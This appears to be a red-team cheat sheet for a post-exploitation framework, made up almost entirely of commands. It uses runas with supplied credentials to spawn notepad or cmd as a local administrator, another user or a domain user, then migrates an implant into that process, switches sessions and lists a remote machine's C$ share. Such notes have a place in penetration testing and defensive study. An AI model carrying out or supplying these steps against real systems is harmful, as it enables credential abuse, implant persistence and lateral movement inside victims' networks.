# Runas

## Injection

### 1) Do a runas to get another shell as the local administrator
    
    runas -d . -u Administrator -P 'password' -n -p C:\\windows\\SysWOW64\\notepad.exe
    runas -d . -u Administrator -P 'password' -n -p C:\\Windows\\System32\\cmd.exe


### 2) As another user

    runas -d . -u userooo -P 'Password123@' -n -p C:\\Windows\\System32\\cmd.exe


### 3) Runas a domain user
    
    runas -d domain.com -u user -P 'Password123!' -n -p C:\\windows\\SysWOW64\\notepad.exe
    runas -d domain.com -u user -P 'Password123!' -n -p C:\\Windows\\System32\\cmd.exe


### 4) Find process

    ps -e notepad


### 5) Migrate into the process

    migrate -p 11216


### 6) Use the new session

    use c4578a6f

### 7) List the C$ 

    ls //machine02.domain.com/c$
